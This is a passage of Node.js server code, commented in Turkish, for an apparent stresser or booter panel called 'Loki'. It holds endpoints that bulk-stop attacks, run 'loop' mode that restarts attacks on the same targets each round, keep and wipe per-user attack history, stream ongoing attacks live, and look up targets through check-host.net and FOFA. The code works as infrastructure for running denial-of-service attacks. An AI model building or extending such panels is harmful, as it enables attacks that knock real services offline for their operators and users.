    const totalBatches = Math.ceil(ids.length / size);

    // Her ID'nin ait oldugu loop'u onceden tespit et (round listesi veya kayit).
    // Batch dongusunde round listeleri temizlendigi icin once bakmak gerek.
    const affectedLoopKeys = new Set();
    ids.forEach((id) => {
      Object.keys(activeLoops).forEach((key) => {
        const loop = activeLoops[key];
        if (loop?.roundAttackIds?.includes(id)) affectedLoopKeys.add(key);
      });
      if (activeAttacks[id]?.loopId) affectedLoopKeys.add(activeAttacks[id].loopId);
    });

    const stopSingle = async (id) => {
      try {
        const response = await stopAttackApi(apiClient, session.apiToken, id);
        return { id, status: 'success', data: response };
      } catch (err) {
        return { id, status: 'error', message: err.message, data: err.response?.data };
      }
    };

    const runWithConcurrency = async (items, fn, limit) => {
      const out = [];
      for (let i = 0; i < items.length; i += limit) {
        const chunk = items.slice(i, i + limit);
        const chunkResults = await Promise.all(chunk.map(fn));
        out.push(...chunkResults);
        if (i + limit < items.length) {
          await new Promise((r) => setTimeout(r, 200));
        }
      }
      return out;
    };

    for (let i = 0; i < ids.length; i += size) {
      const batch = ids.slice(i, i + size);
      const currentBatch = Math.floor(i / size) + 1;

      const batchResults = await runWithConcurrency(batch, stopSingle, concurrent);
      results.push(...batchResults);

      // Durdurulan ID'leri ilgili loop'larin round listelerinden cikar;
      // loop'lar kendi intervaliyle devam etsin.
      batch.forEach((id) => {
        Object.keys(activeLoops).forEach((key) => {
          const loop = activeLoops[key];
          if (loop?.roundAttackIds?.includes(id)) {
            loop.roundAttackIds = loop.roundAttackIds.filter((attackId) => attackId !== id);
            console.log(`[stop/bulk] Loop ${key} roundundan attack ${id} cikarildi`);
          }
        });
      });
      saveState();

      // Son batch degilse kisa bir bekleme (rate limit korumasi)
      if (currentBatch < totalBatches) {
        await new Promise((r) => setTimeout(r, delay));
      }
    }

    // Loop'a ait saldirilar manuel durdurulduysa ilgili loop'lari da durdur;
    // aksi halde loop sonraki turda ayni hedefleri yeniden baslatir ve
    // satirlar panele geri gelir. Loop'lar, asagidaki unregister/history
    // akisindan once durdurulur ki loop history'leri 'stopped' isaretlenebilsin.
    affectedLoopKeys.forEach((key) => {
      const loop = activeLoops[key];
      if (loop?.running) {
        loop.running = false;
        delete activeLoops[key];
        console.log(`[stop/bulk] Loop'a ait saldiri durduruldugu icin loop da durduruldu: ${key}`);
        notifyLoopRemoved(loop, 'durduruldu');
      }
    });
    saveState();

    // Durdurulan tum ID'leri kayittan sil ve history'yi guncelle.
    const stoppedLoopIds = new Set();
    ids.forEach((id) => {
      const attackRecord = activeAttacks[id];
      const loopIdOfAttack = attackRecord?.loopId;
      unregisterAttack(id);
      const history = findActiveHistoryByAttackId(id);
      if (history && !history.loop) {
        updateAttackHistoryStatus(history.historyId, 'stopped');
      }
      if (loopIdOfAttack && !activeLoops[loopIdOfAttack]) {
        stoppedLoopIds.add(loopIdOfAttack);
      }
    });

    // Loop modu sonlandirilmis ve kullanici o loop'un saldirilarini tek tek
    // veya toplu durdurursa, loop history'sini durduruldu olarak isaretle.
    // affectedLoopKeys: kayitta olmayan ID'ler uzerinden etkilenen loop'lari da kapsar.
    new Set([...stoppedLoopIds, ...affectedLoopKeys]).forEach((loopId) => {
      const loopHistoryId = `hist_loop_${loopId}`;
      if (attackHistory[loopHistoryId] && attackHistory[loopHistoryId].status === 'active') {
        updateAttackHistoryStatus(loopHistoryId, 'stopped');
      }
    });

    res.json({ status: 'success', total: ids.length, results });
  } catch (error) {
    handleEndpointError(res, error, 'Bulk stop error');
  }
});

/**
 * POST /api/stresse/loop/stop
 * Body: { loopId }
 */
app.post('/api/stresse/loop/stop', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { loopId } = req.body;
    if (!loopId) {
      // loopId verilmezse tum loop'lari durdur ve kayittan sil
      const stoppedLoops = Object.values(activeLoops);
      Object.keys(activeLoops).forEach((key) => {
        activeLoops[key].running = false;
        delete activeLoops[key];
      });
      saveState();
      stoppedLoops.forEach((loop) => notifyLoopRemoved(loop, 'durduruldu'));
      return res.json({ status: 'success', message: 'Tum looplar durduruldu' });
    }

    if (!activeLoops[loopId]) {
      return res.status(404).json({ status: 'error', message: 'Loop bulunamadi', loopId });
    }

    const loop = activeLoops[loopId];

    // Loop'u "loop modundan" cikar: yeni round baslatma, ama mevcut round'daki
    // saldirilari durdurma. Loop history'si hala "active" kalir; saldirilar
    // normal surelerince bittiginde cleanupExpiredAttacks onu "completed" yapar.
    activeLoops[loopId].running = false;
    delete activeLoops[loopId];
    saveState();
    notifyLoopRemoved(loop, 'durduruldu');
    res.json({ status: 'success', message: 'Loop modu sonlandirildi; mevcut saldirilar devam ediyor', loopId });
  } catch (error) {
    handleEndpointError(res, error, 'Loop stop error');
  }
});

/**
 * GET /api/stresse/loops
 * Tum aktif loop listesini doner (global, herkes gorebilir).
 */
app.get('/api/stresse/loops', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const loops = Object.entries(activeLoops)
      .filter(([_, value]) => value.running)
      .map(([key, value]) => ({
        loopId: key,
        ...value
      }));

    res.json({ status: 'success', count: loops.length, loops });
  } catch (error) {
    handleEndpointError(res, error, 'Loop list error');
  }
});

/**
 * GET /api/stresse/history/:username
 * Kullanicinin saldiri gecmisini doner.
 */
app.get('/api/stresse/history/:username', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { username } = req.params;

    // Sadece kendi gecmisini gorebilir
    const sessionUser = sessions[sessionId]?.username;
    if (sessionUser && sessionUser !== username) {
      return res.status(403).json({ status: 'error', message: 'Forbidden' });
    }

    const records = Object.values(attackHistory)
      .filter((h) => h.username === username)
      .sort((a, b) => new Date(b.startedAt).getTime() - new Date(a.startedAt).getTime());

    res.json({ status: 'success', count: records.length, records });
  } catch (error) {
    handleEndpointError(res, error, 'History fetch error');
  }
});

/**
 * DELETE /api/stresse/history
 * Body: { ids?: string[], all?: boolean }
 *
 * Kullanicinin saldiri gecmisini toplu olarak siler.
 */
app.delete('/api/stresse/history', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const sessionUser = sessions[sessionId]?.username;
    if (!sessionUser) {
      return res.status(401).json({ status: 'error', message: 'Session user not found' });
    }

    const { ids, all = false } = req.body;
    let removed = 0;

    if (all === true) {
      Object.keys(attackHistory).forEach((historyId) => {
        if (attackHistory[historyId].username === sessionUser) {
          delete attackHistory[historyId];
          removed++;
        }
      });
    } else if (Array.isArray(ids) && ids.length > 0) {
      ids.forEach((historyId) => {
        const record = attackHistory[historyId];
        if (record && record.username === sessionUser) {
          delete attackHistory[historyId];
          removed++;
        }
      });
    } else {
      return res.status(400).json({ status: 'error', message: 'ids array or all:true required' });
    }

    saveState();
    console.log(`[history] ${sessionUser} icin ${removed} gecmis kaydi silindi`);
    res.json({ status: 'success', removed });
  } catch (error) {
    handleEndpointError(res, error, 'History delete error');
  }
});

/**
 * GET /api/stresse/loop/:loopId
 * Tek loop detayini doner.
 */
app.get('/api/stresse/loop/:loopId', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { loopId } = req.params;
    const loop = activeLoops[loopId];
    if (!loop) {
      return res.status(404).json({ status: 'error', message: 'Loop bulunamadi', loopId });
    }

    res.json({ status: 'success', loopId, ...loop });
  } catch (error) {
    handleEndpointError(res, error, 'Loop status error');
  }
});

// =====================
// CHECK / RECON TOOLS
// =====================

/**
 * GET /api/check-host?host=...&type=ping|http|tcp|udp|dns
 */
app.get('/api/check-host', async (req, res) => {
  try {
    const { host, type = 'ping' } = req.query;
    if (!host) return res.status(400).json({ status: 'error', message: 'host required' });

    const validTypes = ['ping', 'http', 'tcp', 'udp', 'dns'];
    if (!validTypes.includes(type)) {
      return res.status(400).json({ status: 'error', message: 'Invalid type. Use: ping, http, tcp, udp, dns' });
    }

    // 1. İlk istek: request_id al
    const initResponse = await axios.get(`https://check-host.net/check-${type}`, {
      params: { host, max_nodes: 20 },
      headers: {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0'
      },
      timeout: 20000
    });

    const requestId = initResponse.data.request_id;
    if (!requestId) {
      return res.json({ status: 'success', data: initResponse.data });
    }

    // 2. Sonuçları bekle (max 15 saniye, 3 saniyede bir kontrol)
    let results = null;
    const maxAttempts = 5;
    for (let i = 0; i < maxAttempts; i++) {
      await new Promise(r => setTimeout(r, 3000));
      const resultResponse = await axios.get(`https://check-host.net/check-result/${requestId}`, {
        headers: { 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0' },
        timeout: 15000
      });

      if (resultResponse.data && Object.keys(resultResponse.data).length > 0) {
        results = resultResponse.data;
        break;
      }
    }

    res.json({
      status: 'success',
      host,
      type,
      request_id: requestId,
      results: results || {},
      raw: initResponse.data
    });
  } catch (error) {
    console.error('Check-host error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * GET /api/ping-pe?host=...
 */
app.get('/api/ping-pe', async (req, res) => {
  try {
    const { host } = req.query;
    if (!host) return res.status(400).json({ status: 'error', message: 'host required' });

    // ping.pe does not expose a public API; return a reference link
    res.json({
      status: 'success',
      url: `https://ping.pe/${host}`,
      note: 'Open this link in a browser for MTR results'
    });
  } catch (error) {
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * GET /api/fofa?query=...
 */
app.get('/api/fofa', async (req, res) => {
  try {
    const { query, email, key, size = 10 } = req.query;
    if (!query) return res.status(400).json({ status: 'error', message: 'query required' });
    if (!email || !key) {
      return res.status(400).json({ status: 'error', message: 'FOFA email and API key required' });
    }

    const encodedQuery = Buffer.from(query).toString('base64');
    const response = await axios.get('https://fofa.info/api/v1/search/all', {
      params: { email, key, qbase64: encodedQuery, size },
      timeout: 30000
    });

    res.json({ status: 'success', data: response.data });
  } catch (error) {
    console.error('FOFA error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// =====================
// LIVE ATTACK STREAM (SSE)
// =====================

// SSE hub'lari: username basina TEK upstream poller calisir, tum bagli
// client'lara broadcast edilir. Boylece N sekme = N x 2 upstream istegi yerine
// 3sn'de toplam 1-2 istek atilir.
// username -> { clients: Set<res>, sessionId, timer, lastOngoing, lastUser, consecutiveErrors, tickCount }
const liveHubs = new Map();

// Tum client'lara yazar; kapali client'a yazma hatasinda o client'i set'ten dusurur.
function liveHubBroadcast(hub, chunk) {
  hub.clients.forEach((clientRes) => {
    try {
      clientRes.write(chunk);
    } catch (err) {
      hub.clients.delete(clientRes);
    }
  });
}

// Paylasimli poller tick'i: /ongoing her tick, /user sadece ilk tick ve her
// 10. tickte cekilir. 3 ardisik hatadan sonra aralik 10sn'ye duser (backoff),
// ilk basarida 3sn'ye doner.
async function liveHubTick(hub, username) {
  if (hub.clients.size === 0) return;
  hub.tickCount += 1;
  const fetchUser = hub.tickCount === 1 || hub.tickCount % 10 === 0;
  try {
    const client = getClient(hub.sessionId);
    const requests = [client.get(`/ongoing/${username}`)];
    if (fetchUser) requests.push(client.get(`/user/${username}`));
    const [ongoing, user] = await Promise.all(requests);
    hub.lastOngoing = ongoing.data;
    if (user) hub.lastUser = user.data;
    hub.consecutiveErrors = 0;
    // user yoksa payload'a koyma; client'lar son user'i kullanmaya devam eder.
    const payload = { timestamp: new Date().toISOString(), ongoing: hub.lastOngoing };
    if (user) payload.user = hub.lastUser;
    liveHubBroadcast(hub, `data: ${JSON.stringify(payload)}\n\n`);
  } catch (err) {
    hub.consecutiveErrors += 1;
    liveHubBroadcast(hub, `event: error\ndata: ${JSON.stringify({ message: err.message })}\n\n`);
  }
  if (hub.clients.size === 0) return; // close handler hub'i zaten temizledi
  const delay = hub.consecutiveErrors >= 3 ? 10000 : 3000;
  hub.timer = setTimeout(() => {
    liveHubTick(hub, username).catch((err) => console.error('[liveHub] beklenmeyen tick hatasi:', err));
  }, delay);
}

/**
 * GET /api/stresse/live/:username
 * Server-Sent Events stream of ongoing attacks (hub uzerinden paylasimli poller)
 */
app.get('/api/stresse/live/:username', (req, res) => {
  const sessionId = req.headers['sessionid'] || req.headers['sessionId'] || req.query.sid || req.query.SID;
  const { username } = req.params;

  if (!sessionId) {
    return res.status(401).json({ status: 'error', message: 'Session required' });
  }

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('Access-Control-Allow-Origin', '*');
  // nginx'in SSE event'lerini buffer'lamasini engelle; aksi halde canli akis
  // toplu/gecikmeli gelir.
  res.setHeader('X-Accel-Buffering', 'no');

  try {
    getClient(sessionId);
  } catch (err) {
    res.write(`event: error\ndata: ${JSON.stringify({ message: err.message })}\n\n`);
    return res.end();
  }

  let hub = liveHubs.get(username);
  if (!hub) {
    hub = {
      clients: new Set(),
      sessionId,
      timer: null,
      lastOngoing: null,
      lastUser: null,
      consecutiveErrors: 0,
      tickCount: 0
    };
    liveHubs.set(username, hub);
  }
  // Son gelen session gecerli (ortak panel: herkes herkesi izleyebilir).
  hub.sessionId = sessionId;
  hub.clients.add(res);

  if (!hub.timer) {
    // Paylasimli poller yoksa baslat (ilk tick hemen calisir).
    liveHubTick(hub, username).catch((err) => console.error('[liveHub] beklenmeyen tick hatasi:', err));
  } else if (hub.lastOngoing !== null) {
    // Yeni client'a son bilinen payload'u hemen gonder.
    const payload = { timestamp: new Date().toISOString(), ongoing: hub.lastOngoing };
    if (hub.lastUser) payload.user = hub.lastUser;
    res.write(`data: ${JSON.stringify(payload)}\n\n`);
  }

  req.on('close', () => {
    hub.clients.delete(res);
    // Hub bosaldiysa poller'i durdur ve hub'i sil.
    if (hub.clients.size === 0) {
      if (hub.timer) clearTimeout(hub.timer);
      hub.timer = null;
      liveHubs.delete(username);
    }
  });
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Load persisted sessions/loops before starting server
loadState();
// Restart sonrasi slot bildirimi kacmasin: geri yuklenen saldiri sayisini baz al.
lastAttackCount = Object.keys(activeAttacks).length;

app.listen(PORT, '127.0.0.1', () => {
  console.log(`Loki backend running on http://localhost:${PORT}`);
});
